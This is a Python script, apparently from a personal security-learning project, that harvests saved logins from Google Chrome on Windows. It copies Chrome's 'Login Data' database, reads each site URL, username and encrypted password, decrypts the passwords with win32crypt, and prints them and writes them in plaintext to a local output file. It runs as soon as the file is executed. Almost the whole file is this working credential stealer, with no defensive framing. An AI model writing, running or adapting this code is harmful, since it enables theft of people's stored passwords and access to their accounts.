#
#
# def test():
#     while(True):
#         print("testy test")
#
#
#
# t = threading.Thread(target=test(), daemon=True)
# #do stuff
# t.join()


import os
import win32crypt
from shutil import copyfile
from sqlite3 import connect

destination = "C:\\Users\\kali\\PycharmProjects\\cyberSec\\output.txt"


def getpass():
    path = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data"
    path2 = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login2"
    path = path.strip()
    path2 = path2.strip()
    # path = ""
    # print(path)
    # print(path2)

    try:
        copyfile(path, path2)
    except:
        pass
    conn = connect(path2)
    cursor = conn.cursor()
    cursor.execute(
        'SELECT action_url, username_value, password_value FROM logins')
    if os.path.exists(destination):
        os.remove(destination)
    sites = []
    for raw in cursor.fetchall():
        # print(raw)
        ## raw[0] = url
        ## raw[1] = login
        ## raw[2] = binary
        try:
            if raw[0] not in sites:
                print(format(win32crypt.CryptUnprotectData(raw[2])[1]))
                if os.path.exists(destination):
                    with open(destination, "a") as password:
                        password.write('\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[1] +
                                       '\n' + "Password: " + format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
                else:
                    with open(destination, "a") as password:
                        password.write('\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[1] +
                                       '\n' + "Password: " + format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
                sites.append(raw[0])
        except:
            continue
    conn.close()
    return 0


getpass()
